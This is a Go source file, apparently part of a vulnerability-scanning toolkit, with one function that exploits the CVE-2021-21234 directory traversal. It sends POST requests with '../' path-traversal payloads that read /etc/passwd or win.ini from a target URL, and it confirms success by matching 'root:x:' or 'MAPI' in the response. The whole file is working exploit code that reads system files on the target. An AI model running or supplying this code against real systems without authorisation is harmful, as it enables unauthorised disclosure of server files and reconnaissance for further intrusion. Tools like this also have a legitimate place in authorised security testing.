package exppackage

import (
	"fmt"
	"github.com/fatih/color"
	"io/ioutil"
	"net/http"
	"ssp/common"
	"strings"
)

func CVE_2021_21234(url string) {
	payloads := []string{
		"manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../",
		"log/view?filename=/windows/win.ini&base=../../../../../../../../../../",
		"manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../",
		"log/view?filename=/etc/passwd&base=../../../../../../../../../../",
	}

	client := &http.Client{}

	for _, payload := range payloads {
		req, err := http.NewRequest("POST", url+payload, nil)
		if err != nil {
			fmt.Println("Error creating request:", err)
			return
		}

		resp, err := client.Do(req)
		if err != nil {
			color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
			return
		}
		defer resp.Body.Close()

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("Error reading response:", err)
			return
		}

		if strings.Contains(string(body), "MAPI") {
			common.PrintVulnerabilityConfirmation("CVE-2021-21234", url, "存在 [CVE-2021-21234-Win]", "2")
			return
		} else if strings.Contains(string(body), "root:x:") {
			common.PrintVulnerabilityConfirmation("CVE-2021-21234", url, "存在 [CVE-2021-21234-Linux]", "2")
			return
		}
	}

	color.Yellow("[-] %s 未发现CVE-2021-21234目录遍历漏洞\n", url)
}
